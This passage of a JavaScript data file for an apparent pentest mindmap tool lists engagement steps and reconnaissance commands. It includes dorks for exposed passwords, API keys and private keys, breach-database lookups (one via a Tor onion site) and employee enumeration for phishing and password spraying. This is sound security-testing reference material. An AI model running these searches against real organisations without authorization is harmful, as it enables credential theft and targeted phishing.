window.MINDMAP_GENERAL_DATA = {
    root: {
        id: 'gen-root',
        data: {
            label: 'General Pentest',
            description: 'Engagement Workflow',
            descriptionMd: '## Engagement Workflow\n- Pre-Engagement\n- Recon\n- Vulnerability Analysis\n- Exploit\n- Post-Exploit\n- Reporting\n- Retest / Validation\n',
            commands: [],
            type: 'root',
            emoji: '🛡️',
            resources: [{
                    title: 'NIST SP 800-115 (Technical Guide to Information Security Testing)',
                    url: 'https://csrc.nist.gov/publications/detail/sp/800-115/final'
                },
                {
                    title: 'OWASP Web Security Testing Guide',
                    url: 'https://owasp.org/www-project-web-security-testing-guide/'
                }
            ]
        },
        children: [{
                id: 'pre-engagement',
                data: {
                    label: 'Pre-Engagement',
                    description: 'Rules, Scope, and Safety',
                    descriptionMd: '### Pre-Engagement\nDefine **authorization**, scope boundaries, safety constraints, and success criteria before touching targets.\n\n- In-scope assets (hosts, apps, cloud accounts)\n- Out-of-scope exclusions\n- Testing windows & rate limits\n- Data handling & evidence rules\n- Comms & escalation (on-call, incident triggers)\n',
                    commands: [{
                            description: 'Checklist (local notes)',
                            code: 'mkdir -p engagement/{scope,notes,evidence,report}'
                        },
                        {
                            description: 'Time sync (evidence integrity)',
                            code: 'timedatectl status'
                        }
                    ],
                    type: 'category',
                    emoji: '🧾',
                    resources: [{
                            title: 'PTES Pre-Engagement',
                            url: 'https://www.pentest-standard.org/index.php/Pre-engagement'
                        },
                        {
                            title: 'OWASP Testing Guide - Before the Audit',
                            url: 'https://owasp.org/www-project-web-security-testing-guide/v4.2/2-Introduction/02-Testing_Process'
                        }
                    ]
                },
                children: [{
                        id: 'scope',
                        data: {
                            label: 'Scope & ROE',
                            description: 'Authorization & Boundaries',
                            descriptionMd: '### Scope & Rules of Engagement\nLock down what is allowed: **targets**, **methods**, **limits**, and **stop conditions**.\n\n- Authentication testing policy (test accounts)\n- DoS / stress testing policy\n- Phishing / social constraints (if any)\n- Data exfil simulation boundaries\n',
                            commands: [{
                                description: 'Scope file (example)',
                                code: 'cat > scope.md << "EOF"\n# Scope\n## In-scope\n- \n## Out-of-scope\n- \n## Constraints\n- \n## Contacts\n- \nEOF'
                            }],
                            type: 'technique',
                            emoji: '📜',
                            resources: []
                        },
                        children: []
                    },
                    {
                        id: 'opsec',
                        data: {
                            label: 'OpSec & Safety',
                            description: 'Reduce risk during testing',
                            descriptionMd: '### Operational Safety\nKeep tests controlled and reversible.\n\n- Prefer read-only discovery first\n- Throttle scanners (rate, concurrency)\n- Avoid destructive payloads\n- Keep clean evidence trails\n',
                            commands: [{
                                description: 'User agent / headers baseline',
                                code: 'export UA="Pentest-Engagement (contact: security@company.tld)"'
                            }],
                            type: 'technique',
                            emoji: '🧯',
                            resources: []
                        },
                        children: []
                    }
                ]
            },

            {
                "id": "recon",
                "data": {
                    "label": "Reconnaissance",
                    "description": "Information Gathering",
                    "descriptionMd": "### Reconnaissance\nThis is the initial phase of any security assessment. The goal is to gather as much intelligence as possible to shape the attack plan. Reconnaissance is divided into two main categories: **Passive** (interacting with public data, not the target directly) and **Active** (sending packets to the target).\n\n**Key Principles:**\n* **Thoroughness over Speed:** Better to spend days in recon than hours in exploitation.\n* **Document Everything:** Maintain detailed notes of all findings, tools used, and timestamps.\n* **Multiple Sources:** Cross-reference data from various sources for accuracy.\n* **Legal Boundaries:** Always ensure you have explicit permission for active reconnaissance.\n* **OPSEC:** Consider your footprint - passive recon leaves no trace, active recon does.\n\n**Recon Mindset:**\nThink like an attacker. Look for the path of least resistance: forgotten assets, legacy systems, third-party integrations, and human elements (social engineering vectors).",
                    "commands": [],
                    "type": "category",
                    "emoji": "🔎",
                    "resources": [{
                            "title": "OWASP WSTG - Information Gathering",
                            "url": "https://owasp.org/www-project-web-security-testing-guide/v4.2/4-Web_Application_Security_Testing/01-Information_Gathering/"
                        },
                        {
                            "title": "MITRE ATT&CK - Reconnaissance",
                            "url": "https://attack.mitre.org/tactics/TA0043/"
                        },
                        {
                            "title": "PTES - Intelligence Gathering",
                            "url": "http://www.pentest-standard.org/index.php/Intelligence_Gathering"
                        },
                        {
                            "title": "NIST SP 800-115",
                            "url": "https://csrc.nist.gov/publications/detail/sp/800-115/final"
                        }
                    ]
                },
                "children": [{
                    "id": "passive",
                    "data": {
                        "label": "Passive Recon",
                        "description": "OSINT & Footprinting",
                        "descriptionMd": "### Passive Reconnaissance\nThis phase involves low-noise discovery using public data sources. The target should not know you are gathering information. This includes looking at WHOIS records, DNS history, public code repositories, and leaked credentials.\n\n**Why Passive First?**\n* **Stealth:** No direct interaction with target infrastructure.\n* **Legal Safety:** Public information gathering is generally legal.\n* **Comprehensive:** Often reveals more than active scanning.\n* **Context Building:** Understand the organization before technical probing.\n\n**Key Data Points to Collect:**\n* Domain registration details and nameservers\n* Email addresses and employee information\n* Technology stack and third-party services\n* IP ranges and ASN information\n* Historical data and changes over time\n* Breached credentials and leaked data\n* Social media presence and company structure",
                        "commands": [],
                        "type": "category",
                        "emoji": "👁️",
                        "resources": [{
                                "title": "OSINT Framework",
                                "url": "https://osintframework.com/"
                            },
                            {
                                "title": "Awesome OSINT",
                                "url": "https://github.com/jivoi/awesome-osint"
                            }
                        ]
                    },
                    "children": [{
                            "id": "osint",
                            "data": {
                                "label": "OSINT",
                                "description": "Open Source Intel",
                                "descriptionMd": "### Open Source Intelligence (OSINT)\nUtilize search engines and public databases to find:\n\n**Corporate Intelligence:**\n* **Company domains & acquisitions:** Discover all assets under corporate umbrella\n* **Employee names & emails:** Build lists for phishing/password spraying campaigns\n* **Public leaks & breaches:** Check if credentials are already compromised\n* **Tech stack details:** Job postings reveal technologies (\"Must know Django, AWS, Redis\")\n* **Organizational structure:** LinkedIn for hierarchy, reporting lines\n* **Physical locations:** Offices, data centers, network infrastructure\n\n**Google Dorking Techniques:**\n* `site:` - Limit to specific domain\n* `inurl:` - Search in URL path\n* `intext:` - Search in page content\n* `filetype:` or `ext:` - Find specific file types\n* `intitle:` - Search in page titles\n* `-` (minus) - Exclude terms\n* `*` (wildcard) - Match any word\n\n**Shodan Search Operators:**\n* `org:` - Search by organization\n* `net:` - Search IP ranges (CIDR)\n* `port:` - Specific ports\n* `product:` - Software/hardware products\n* `vuln:` - Known CVEs\n* `ssl:` - Certificate details",
                                "commands": [{
                                        "description": "Google Dorks (Sensitive Files)",
                                        "code": "site:target.com ext:pdf OR ext:docx OR ext:xlsx OR ext:pptx \"confidential\" OR \"internal\" OR \"restricted\""
                                    },
                                    {
                                        "description": "Google Dorks (Login Pages)",
                                        "code": "site:target.com inurl:login OR inurl:admin OR inurl:dashboard OR inurl:portal"
                                    },
                                    {
                                        "description": "Google Dorks (Config Files)",
                                        "code": "site:target.com ext:env OR ext:config OR ext:ini OR ext:xml OR ext:yml \"password\" OR \"api_key\""
                                    },
                                    {
                                        "description": "Google Dorks (Directory Listings)",
                                        "code": "site:target.com intitle:\"Index of /\" OR intitle:\"Directory listing\""
                                    },
                                    {
                                        "description": "Google Dorks (Error Messages)",
                                        "code": "site:target.com \"SQL syntax\" OR \"mysql_fetch\" OR \"Warning: include\" OR \"Fatal error\""
                                    },
                                    {
                                        "description": "Whois Lookup",
                                        "code": "whois target.com"
                                    },
                                    {
                                        "description": "Whois (Historical)",
                                        "code": "whois -h whois.domaintools.com target.com"
                                    },
                                    {
                                        "description": "ASN Lookup",
                                        "code": "whois -h whois.cymru.com \" -v AS[NUMBER]\""
                                    },
                                    {
                                        "description": "Reverse Whois (By Email)",
                                        "code": "Use tools like: viewdns.info or domaintools.com"
                                    },
                                    {
                                        "description": "Shodan Org Search",
                                        "code": "shodan search \"org:Target\" --fields ip_str,port,org,hostnames"
                                    },
                                    {
                                        "description": "Shodan (Specific Product)",
                                        "code": "shodan search \"product:nginx org:Target\""
                                    },
                                    {
                                        "description": "Shodan (Vulnerable Services)",
                                        "code": "shodan search \"vuln:CVE-2021-44228 org:Target\""
                                    },
                                    {
                                        "description": "TheHarvester (Emails/Hosts)",
                                        "code": "theHarvester -d target.com -b google,linkedin,bing,baidu,duckduckgo"
                                    },
                                    {
                                        "description": "TheHarvester (All Sources)",
                                        "code": "theHarvester -d target.com -b all -l 500"
                                    },
                                    {
                                        "description": "Hunter.io Email Search",
                                        "code": "curl \"https://api.hunter.io/v2/domain-search?domain=target.com&api_key=YOUR_KEY\""
                                    },
                                    {
                                        "description": "LinkedIn Employee Enum",
                                        "code": "site:linkedin.com \"Target Company\" \"Software Engineer\""
                                    },
                                    {
                                        "description": "Crunchbase Intel",
                                        "code": "Search acquisitions, funding, executives at crunchbase.com"
                                    }
                                ],
                                "type": "technique",
                                "emoji": "🌐",
                                "resources": [{
                                        "title": "Google Hacking Database",
                                        "url": "https://www.exploit-db.com/google-hacking-database"
                                    },
                                    {
                                        "title": "Shodan Search Queries",
                                        "url": "https://github.com/jakejarvis/awesome-shodan-queries"
                                    },
                                    {
                                        "title": "DorkSearch",
                                        "url": "https://dorksearch.com/"
                                    }
                                ]
                            },
                            "children": []
                        },
                        {
                            "id": "subdomains",
                            "data": {
                                "label": "Subdomains",
                                "description": "Expansion",
                                "descriptionMd": "### Subdomain Discovery\nExpanding the attack surface is critical. Use multiple sources (API scraping, brute forcing, recursive enumeration) and combine results to find forgotten dev/staging environments.\n\n**Why Subdomains Matter:**\n* **Expanded Attack Surface:** Each subdomain is a potential entry point\n* **Forgotten Assets:** Old dev/staging environments often lack security\n* **Third-Party Services:** Subdomains pointing to abandoned services (subdomain takeover)\n* **Internal Exposure:** Accidentally public internal tools (jenkins.target.com, gitlab.target.com)\n\n**Discovery Techniques:**\n1. **Passive API Scraping:** Query certificate transparency logs, DNS aggregators, search engines\n2. **Active Brute-forcing:** Use wordlists to guess common patterns\n3. **DNS Zone Walking:** Enumerate DNSSEC if enabled\n4. **Recursive Discovery:** Find subdomains of subdomains\n5. **VHost Discovery:** Multiple domains on same IP\n\n**Common Subdomain Patterns:**\n* Development: dev, staging, test, qa, uat, demo\n* Internal Tools: jenkins, gitlab, jira, confluence, vpn\n* Geographic: us, eu, asia, uk, de, fr\n* Functions: api, mail, mx, ftp, admin, portal\n* Legacy: old, legacy, v1, backup",
                                "commands": [{
                                        "description": "Subfinder (Passive Multi-Source)",
                                        "code": "subfinder -d target.com -all -recursive -o subs_passive.txt"
                                    },
                                    {
                                        "description": "Subfinder (With API Keys)",
                                        "code": "subfinder -d target.com -all -config ~/.config/subfinder/config.yaml -o subs.txt"
                                    },
                                    {
                                        "description": "Amass (Intel + Enum)",
                                        "code": "amass intel -d target.com -whois"
                                    },
                                    {
                                        "description": "Amass (Active Enum)",
                                        "code": "amass enum -active -d target.com -brute -w wordlist.txt -o amass_active.txt"
                                    },
                                    {
                                        "description": "Amass (Passive Only)",
                                        "code": "amass enum -passive -d target.com -o amass_passive.txt"
                                    },
                                    {
                                        "description": "Assetfinder",
                                        "code": "assetfinder --subs-only target.com > subs_asset.txt"
                                    },
                                    {
                                        "description": "Findomain",
                                        "code": "findomain -t target.com -u findomain_subs.txt"
                                    },
                                    {
                                        "description": "Sublist3r",
                                        "code": "sublist3r -d target.com -o sublist3r.txt"
                                    },
                                    {
                                        "description": "Chaos ProjectDiscovery",
                                        "code": "chaos -d target.com -silent"
                                    },
                                    {
                                        "description": "DNSGen (Permutations)",
                                        "code": "cat subs.txt | dnsgen - | massdns -r resolvers.txt -o S -w dnsgen_output.txt"
                                    },
                                    {
                                        "description": "PureDNS (Validate + Resolve)",
                                        "code": "puredns bruteforce wordlist.txt target.com -r resolvers.txt -w validated_subs.txt"
                                    },
                                    {
                                        "description": "Combine & Deduplicate",
                                        "code": "cat subs_*.txt | sort -u | tee all_subs.txt"
                                    },
                                    {
                                        "description": "Resolve Subdomains (MassDNS)",
                                        "code": "massdns -r resolvers.txt -t A -o S all_subs.txt -w resolved_subs.txt"
                                    },
                                    {
                                        "description": "ShuffleDNS (Active Brute)",
                                        "code": "shuffledns -d target.com -w wordlist.txt -r resolvers.txt -o shuffledns_output.txt"
                                    }
                                ],
                                "type": "tool",
                                "emoji": "📋",
                                "resources": [{
                                        "title": "DNS Wordlists",
                                        "url": "https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS"
                                    },
                                    {
                                        "title": "Subdomain Enumeration Guide",
                                        "url": "https://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html"
                                    }
                                ]
                            },
                            "children": []
                        },
                        {
                            "id": "cert-transparency",
                            "data": {
                                "label": "Certificate Transparency",
                                "description": "Discover hostnames via cert logs",
                                "descriptionMd": "### Certificate Transparency (CT)\nCertificate logs are a goldmine. Companies must register SSL certificates in public logs. This often reveals **hidden hostnames**, internal subdomains, and cloud environments before they are even linked in DNS.\n\n**Why CT Logs Are Valuable:**\n* **Pre-DNS Discovery:** Certificates issued before DNS records are created\n* **Internal Hostnames:** VPN servers, internal tools, development environments\n* **Wildcard Certificates:** Reveal naming conventions (*.api.target.com)\n* **Historical Data:** Old certificates show infrastructure changes\n* **Cloud Resources:** AWS, Azure, GCP endpoints\n\n**CT Log Sources:**\n* crt.sh - Most popular, comprehensive database\n* Censys - Certificate search with advanced filtering\n* CertSpotter - Real-time monitoring\n* Facebook CT - High-performance API\n* Google CT - Official transparency logs\n\n**What to Look For:**\n* Unusual or internal-looking names\n* Services in subdomain names (vpn, gitlab, jenkins)\n* Geographic or environment indicators (us-east, prod, staging)\n* Third-party services and integrations\n* Expired/revoked certificates (might still be active)",
                                "commands": [{
                                        "description": "crt.sh (All Subdomains)",
                                        "code": "curl -s \"https://crt.sh/?q=%25.target.com&output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u"
                                    },
                                    {
                                        "description": "crt.sh (Common Names Only)",
                                        "code": "curl -s \"https://crt.sh/?q=%25.target.com&output=json\" | jq -r '.[].common_name' | sort -u"
                                    },
                                    {
                                        "description": "CertSpotter",
                                        "code": "curl -s \"https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names\" | jq '.[].dns_names[]' | sort -u"
                                    },
                                    {
                                        "description": "Censys Certificate Search",
                                        "code": "censys search 'parsed.names: target.com' --index-type certificates"
                                    },
                                    {
                                        "description": "ctfr (CT Finder)",
                                        "code": "python3 ctfr.py -d target.com -o ctfr_output.txt"
                                    },
                                    {
                                        "description": "Certificate Transparency + Resolve",
                                        "code": "curl -s \"https://crt.sh/?q=%25.target.com&output=json\" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u | httpx -silent"
                                    },
                                    {
                                        "description": "Monitor New Certificates",
                                        "code": "certstream --json | grep target.com"
                                    }
                                ],
                                "type": "technique",
                                "emoji": "📜",
                                "resources": [{
                                        "title": "Crt.sh",
                                        "url": "https://crt.sh/"
                                    },
                                    {
                                        "title": "Certificate Transparency Overview",
                                        "url": "https://certificate.transparency.dev/"
                                    },
                                    {
                                        "title": "Censys Search",
                                        "url": "https://search.censys.io/"
                                    }
                                ]
                            },
                            "children": []
                        },
                        {
                            "id": "code-osint",
                            "data": {
                                "label": "Code OSINT",
                                "description": "Repos, keys, endpoints",
                                "descriptionMd": "### Code OSINT\nDevelopers often accidentally commit sensitive data. Search public repositories (GitHub, GitLab, Bitbucket) for **API endpoints**, **hardcoded secrets/API keys**, **database credentials**, and **environment configuration** files.\n\n**Common Leaks:**\n* **API Keys & Tokens:** AWS keys, GitHub tokens, API credentials\n* **Database Credentials:** Connection strings with passwords\n* **Private Keys:** SSH keys, SSL certificates, JWT signing keys\n* **Configuration Files:** .env, config.php, application.properties\n* **Internal URLs:** API endpoints, admin panels, internal services\n* **Comments:** TODO with sensitive info, disabled debug code\n* **Commit History:** Passwords removed from code but still in git history\n\n**Search Strategies:**\n1. **Organization Repositories:** Find all repos under target org\n2. **Employee Repositories:** Personal projects may leak work credentials\n3. **Forked Repositories:** Forks might contain sensitive data removed from original\n4. **Gists & Pastebin:** Quick code shares often have secrets\n5. **Commit Messages:** Descriptive messages reveal architecture\n6. **Issue Trackers:** Bug reports expose vulnerabilities\n\n**File Types to Target:**\n* .env, .git, .config, .yml, .json\n* package.json, composer.json, requirements.txt\n* Dockerfile, docker-compose.yml\n* .aws/credentials, .ssh/\n* backup.sql, dump.sql",
                                "commands": [{
                                        "description": "GitHub Dork (API Keys)",
                                        "code": "\"target.com\" \"api_key\" OR \"apikey\" OR \"api-key\""
                                    },
                                    {
                                        "description": "GitHub Dork (Secrets)",
                                        "code": "\"target.com\" \"Authorization: Bearer\" OR \"password\" OR \"secret\""
                                    },
                                    {
                                        "description": "GitHub Dork (AWS Keys)",
                                        "code": "\"target.com\" \"AKIA\" OR \"aws_access_key_id\" OR \"aws_secret_access_key\""
                                    },
                                    {
                                        "description": "GitHub Dork (S3 Buckets)",
                                        "code": "\"target.com\" \"s3.amazonaws.com\" OR \"s3://\""
                                    },
                                    {
                                        "description": "GitHub Dork (Database)",
                                        "code": "\"target.com\" \"mysql://\" OR \"postgresql://\" OR \"mongodb://\""
                                    },
                                    {
                                        "description": "GitHub Dork (Private Keys)",
                                        "code": "\"target.com\" \"BEGIN RSA PRIVATE KEY\" OR \"BEGIN OPENSSH PRIVATE KEY\""
                                    },
                                    {
                                        "description": "Trufflehog (Repo Scan)",
                                        "code": "trufflehog git https://github.com/target/repo.git --json"
                                    },
                                    {
                                        "description": "Trufflehog (GitHub Org)",
                                        "code": "trufflehog github --org=target-org --json"
                                    },
                                    {
                                        "description": "GitLeaks (Local Repo)",
                                        "code": "gitleaks detect --source=. -v --report-path=gitleaks-report.json"
                                    },
                                    {
                                        "description": "GitLeaks (Remote Repo)",
                                        "code": "gitleaks detect --source=https://github.com/target/repo -v"
                                    },
                                    {
                                        "description": "GitRob (GitHub Org)",
                                        "code": "gitrob -github-access-token TOKEN target-org"
                                    },
                                    {
                                        "description": "GitDorker (Automated Dorking)",
                                        "code": "python3 GitDorker.py -tf TOKENSFILE -q target.com -d dorks/alldorks.txt"
                                    },
                                    {
                                        "description": "GitHub Search via CLI",
                                        "code": "gh search repos 'target.com password' --language python"
                                    },
                                    {
                                        "description": "GitLab Secret Detection",
                                        "code": "gitleaks detect --source=https://gitlab.com/target/repo -v"
                                    }
                                ],
                                "type": "technique",
                                "emoji": "🧬",
                                "resources": [{
                                        "title": "GitHub Dork Cheatsheet",
                                        "url": "https://github.com/techgaun/github-dorks"
                                    },
                                    {
                                        "title": "GitLeaks Rules",
                                        "url": "https://github.com/gitleaks/gitleaks"
                                    },
                                    {
                                        "title": "Secret Scanning Patterns",
                                        "url": "https://docs.github.com/en/code-security/secret-scanning/secret-scanning-patterns"
                                    }
                                ]
                            },
                            "children": []
                        },
                        {
                            "id": "leaked-creds",
                            "data": {
                                "label": "Credential Leaks",
                                "description": "Breaches & paste sites",
                                "descriptionMd": "### Leaked Credentials & Data Breaches\nCheck if employee credentials or company data has been exposed in previous breaches. These credentials can be used for initial access via password spraying or credential stuffing.\n\n**Sources of Leaked Data:**\n* **Data Breaches:** LinkedIn, Adobe, Yahoo breaches containing emails/passwords\n* **Paste Sites:** Pastebin, Ghostbin, dump sites\n* **Combo Lists:** Username:password combinations from multiple breaches\n* **Stealer Logs:** Malware-harvested credentials from infected machines\n* **Dark Web Markets:** Sold databases and credentials\n\n**What to Search For:**\n* Corporate email addresses (@target.com)\n* Passwords associated with employees\n* Database dumps mentioning the company\n* Customer data leaks\n* Source code leaks\n\n**OPSEC Warning:** Be careful when searching for or downloading breach data. Some jurisdictions consider possession of breached data illegal, even for security research. Use legitimate services when possible.",
                                "commands": [{
                                        "description": "HaveIBeenPwned (Email Check)",
                                        "code": "curl -H \"hibp-api-key: YOUR_KEY\" https://haveibeenpwned.com/api/v3/breachedaccount/user@target.com"
                                    },
                                    {
                                        "description": "HaveIBeenPwned (Domain)",
                                        "code": "Use web interface at haveibeenpwned.com/DomainSearch"
                                    },
                                    {
                                        "description": "Dehashed Search",
                                        "code": "curl \"https://api.dehashed.com/search?query=email:@target.com\" -u EMAIL:API_KEY"
                                    },
                                    {
                                        "description": "IntelligenceX Search",
                                        "code": "curl -X POST \"https://2.intelx.io/phonebook/search\" -H \"x-key: YOUR_KEY\" -d '{\"term\":\"target.com\",\"maxresults\":10000}'\""
                                    },
                                    {
                                        "description": "WeLeakInfo Alternative",
                                        "code": "Check services like: dehashed.com, leak-lookup.com"
                                    },
                                    {
                                        "description": "PwnDB (Tor Required)",
                                        "code": "Access via Tor at: pwndb2am4tzkvold.onion"
                                    },
                                    {
                                        "description": "Breach Directory Search",
                                        "code": "Use breach-parse.sh to search local dumps: ./breach-parse.sh @target.com"
                                    },
                                    {
                                        "description": "H8mail (OSINT Email)",
                                        "code": "h8mail -t user@target.com -bc local_breaches/ -sk"
                                    }
                                ],
                                "type": "technique",
                                "emoji": "🔓",
                                "resources": [{
                                        "title": "HaveIBeenPwned",
                                        "url": "https://haveibeenpwned.com/"
                                    },
                                    {
                                        "title": "Dehashed",
                                        "url": "https://dehashed.com/"
                                    },
                                    {
                                        "title": "IntelligenceX",
                                        "url": "https://intelx.io/"
                                    }
                                ]
                            },
                            "children": []
                        },
                        {
                            "id": "metadata",
                            "data": {
                                "label": "Document Metadata",
                                "description": "Users, paths, software",
                                "descriptionMd": "### Metadata Analysis\nPublicly available documents (PDF, DOCX, XLSX, PPTX) often contain hidden metadata. This can leak **usernames** (for brute force lists), **internal file paths**, **software versions** (e.g., 'Adobe Acrobat 9.0', 'Microsoft Word 2016'), **GPS coordinates** from images, and printer/scanner serial numbers.\n\n**Metadata Can Reveal:**\n* **Author Names:** Real names and usernames of employees\n* **Creation/Modification Dates:** When documents were created\n* **Software Versions:** Applications used (potential CVEs)\n* **Internal File Paths:** Network shares, drive structures (C:\\Users\\john.doe\\Documents\\)\n* **Company Details:** Organization names, departments\n* **Email Addresses:** Embedded in properties\n* **Document Templates:** Standard corporate templates\n* **Revision History:** Track changes, deleted content\n* **GPS Coordinates:** Location data from images taken with phones\n* **Camera/Device Info:** Phone models, camera settings\n\n**Document Sources:**\n* Corporate website downloads\n* Press releases and PDFs\n* Annual reports and presentations\n* Job postings with example files\n* Public Dropbox/Google Drive shares\n* Slideshare and DocShare presentations\n\n**Analysis Tools:**\n* ExifTool - Universal metadata reader\n* FOCA - Automated document analysis (Windows)\n* Metagoofil - Automated document harvesting\n* MAT2 - Metadata removal tool (helps understand what's there)",
                                "commands": [{
                                        "description": "Download All PDFs from Site",
                                        "code": "wget -r -l1 -A.pdf https://target.com"
                                    },
                                    {
                                        "description": "Download Multiple File Types",
                                        "code": "wget -r -l2 -A.pdf,.docx,.xlsx,.pptx https://target.com"
                                    },
                                    {
                                        "description": "Exiftool (Single File)",
                                        "code": "exiftool file.pdf"
                                    },
                                    {
                                        "description": "Exiftool (Batch Extract Authors)",
                                        "code": "exiftool -Author -Creator -r *.pdf | sort -u"
                                    },
                                    {
                                        "description": "Exiftool (Find Internal Paths)",
                                        "code": "exiftool -r -p '$Directory/$FileName:$Producer' *.pdf | grep -i 'C:\\\\'"
                                    },
                                    {
                                        "description": "Metagoofil (Automated)",
                                        "code": "metagoofil -d target.com -t pdf,doc,xls,ppt -l 200 -n 50 -o downloads/ -f results.html"
                                    },
                                    {
                                        "description": "FOCA (Windows GUI)",
                                        "code": "Use FOCA GUI to analyze downloaded documents and extract metadata"
                                    },
                                    {
                                        "description": "Extract Email Addresses",
                                        "code": "exiftool -ee -Email -r *.pdf *.docx | grep '@' | sort -u"
                                    },
                                    {
                                        "description": "Image EXIF GPS Data",
                                        "code": "exiftool -gps:all -n image.jpg"
                                    },
                                    {
                                        "description": "Find Software Versions",
                                        "code": "exiftool -Producer -Creator -r * | grep -Ei 'acrobat|word|excel'"
                                    }
                                ],
                                "type": "tool",
                                "emoji": "🧾",
                                "resources": [{
                                        "title": "ExifTool Documentation",
                                        "url": "https://exiftool.org/"
                                    },
                                    {
                                        "title": "FOCA Download",
                                        "url": "https://github.com/ElevenPaths/FOCA"
                                    },
                                    {
                                        "title": "Metadata Extraction Guide",
                                        "url": "https://null-byte.wonderhowto.com/how-to/hack-like-pro-extracting-metadata-from-documents-0167336/"
                                    }
                                ]
                            },
                            "children": []
                        },
                        {
                            "id": "wayback",
                            "data": {
                                "label": "Internet History",
                                "description": "Old endpoints & files",
                                "descriptionMd": "### Internet History (Wayback Machine & Archives)\nAnalyze historical versions of the target's website. You may find **old API endpoints**, **developer comments**, **forgotten backup files**, **older JavaScript files** with different logic, **removed admin panels**, or **deprecated features** that still work.\n\n**Why Historical Data Matters:**\n* **Forgotten Endpoints:** Old admin panels, debug pages, API routes\n* **Exposed Credentials:** Old config files cached by archives\n* **Technology Changes:** Previous frameworks/software with known vulnerabilities\n* **Documentation:** Old API docs revealing current undocumented endpoints\n* **Developer Comments:** TODO notes, test credentials in cached JS\n* **Backup Files:** .bak, .old, .backup extensions\n* **Robots.txt History:** Previously disallowed paths might still be accessible\n* **Sitemap Changes:** Removed sections of the site\n\n**Archive Sources:**\n* **Wayback Machine:** Most comprehensive, billions of pages\n* **Archive.today:** Alternative archive, different coverage\n* **CommonCrawl:** Massive web crawl data\n* **Google/Bing Cache:** Recent cached versions\n* **GitHub Archive:** Old versions of open-source projects\n\n**Analysis Techniques:**\n1. Compare current vs historical versions\n2. Extract all unique URLs from archives\n3. Look for removed parameters and endpoints\n4. Check for exposed .git directories in archives\n5. Find old JavaScript files with sensitive functions",
                                "commands": [{
                                        "description": "Waybackurls (All Historical URLs)",
                                        "code": "waybackurls target.com | tee wayback_data.txt"
                                    },
                                    {
                                        "description": "Waybackurls (With Timestamps)",
                                        "code": "waybackurls -dates target.com"
                                    },
                                    {
                                        "description": "Gau (Get All URLs)",
                                        "code": "gau target.com --threads 5 --o gau_output.txt"
                                    },
                                    {
                                        "description": "Gau (Multiple Sources)",
                                        "code": "gau --providers wayback,commoncrawl,otx,urlscan target.com"
                                    },
                                    {
                                        "description": "Waybackpack (Download Archives)",
                                        "code": "waybackpack target.com -d wayback_downloads/"
                                    },
                                    {
                                        "description": "Find Interesting Parameters",
                                        "code": "cat wayback_data.txt | grep -E '\\?(.*=.*)' | sort -u"
                                    },
                                    {
                                        "description": "Filter for Endpoints",
                                        "code": "cat wayback_data.txt | grep -E '/api/|/admin/|/dashboard/|/config/'"
                                    },
                                    {
                                        "description": "Find Sensitive Files",
                                        "code": "cat wayback_data.txt | grep -E '\\.env|\\.config|\\.bak|\\.sql|\\.old|\\.backup'"
                                    },
                                    {
                                        "description": "Extract JavaScript Files",
                                        "code": "cat wayback_data.txt | grep '\\.js$' | sort -u > js_files.txt"
                                    },
                                    {
                                        "description": "Paramspider (Wayback Params)",
                                        "code": "paramspider -d target.com --wayback"
                                    },
                                    {
                                        "description": "Check Archive.today",
                                        "code": "curl -s \"http://archive.today/target.com\""
                                    },
                                    {
                                        "description": "Historical Robots.txt",
                                        "code": "curl -s \"https://web.archive.org/web/*/target.com/robots.txt\""
                                    }
                                ],
                                "type": "technique",
                                "emoji": "🕰️",
                                "resources": [{
                                        "title": "Wayback Machine",
                                        "url": "https://web.archive.org/"
                                    },
                                    {
                                        "title": "Archive.today",
                                        "url": "https://archive.today/"
                                    },
                                    {
                                        "title": "CommonCrawl",
                                        "url": "https://commoncrawl.org/"
                                    }
                                ]
                            },
                            "children": []
                        },
                        {
                            "id": "social-media",
                            "data": {
                                "label": "Social Media OSINT",
                                "description": "Employees, culture, tech stack",
                                "descriptionMd": "### Social Media Intelligence\nSocial media platforms reveal organizational structure, employee information, technology stack, and potential social engineering vectors.\n\n**Platforms to Monitor:**\n* **LinkedIn:** Employee roles, technologies used (endorsements), job postings reveal tech stack\n* **Twitter/X:** Company announcements, employee complaints, technical discussions\n* **GitHub:** Developer activity, projects, code commits\n* **Reddit:** Employee posts in tech subreddits, company discussions\n* **Stack Overflow:** Employees asking technical questions (may reveal architecture)\n* **Facebook/Instagram:** Company culture, office photos (badge designs, layouts)\n\n**Information to Extract:**\n* Employee names and roles for org chart\n* Email format patterns (first.last@, flast@)\n* Technologies and tools mentioned\n* Office locations and security measures visible in photos\n* Upcoming events, conferences, maintenance windows\n* Disgruntled employees (potential insider threat indicators)",
                                "commands": [{
                                        "description": "LinkedIn Employee Enumeration",
                                        "code": "site:linkedin.com/in \"Target Company\" \"Software Engineer\""
                                    },
                                    {
                                        "description": "LinkedIn Technology Search",
                                        "code": "site:linkedin.com \"Target Company\" \"skills\" (\"AWS\" OR \"Azure\" OR \"Python\")"
                                    },
                                    {
                                        "description": "LinkedIn Job Postings",
                                        "code": "site:linkedin.com/jobs \"Target Company\" (\"required\" OR \"experience with\")"
                                    },
                                    {
                                        "description": "Twitter Search (Tech Stack)",
                                        "code": "from:targetcompany (\"using\" OR \"built with\" OR \"powered by\")"
                                    },
                                    {
                                        "description": "GitHub Organization Repos",
                                        "code": "gh repo list target-org --limit 1000"
                                    },
                                    {
                                        "description": "Stack Overflow Company Tag",
                                        "code": "site:stackoverflow.com \"Target Company\" OR \"target.com\""
                                    },
                                    {
                                        "description": "Reddit Mentions",
                                        "code": "site:reddit.com \"Target Company\" (\"work at\" OR \"employee\")"
                                    },
                                    {
                                        "description": "Instagram Location Tags",
                                        "code": "Search location tags for company offices to see interior photos"
                                    },
                                    {
                                        "description": "Glassdoor Reviews",
                                        "code": "site:glassdoor.com \"Target Company\" (\"interview\" OR \"technology\")"
                                    }
                                ],
                                "type": "technique",
                                "emoji": "👥",
                                "resources": [{
                                        "title": "LinkedIn OSINT Guide",
                                        "url": "https://www.intelligencewithsteve.com/post/linkedin-osint"
                                    },
                                    {
                                        "title": "Social Media OSINT Tools",
                                        "url": "https://github.com/C3n7ral051nt4g3ncy/Masto"
                                    }
                                ]
                            },
                            "children": []
                        },
                        {
                            "id": "dns-enum",
                            "data": {
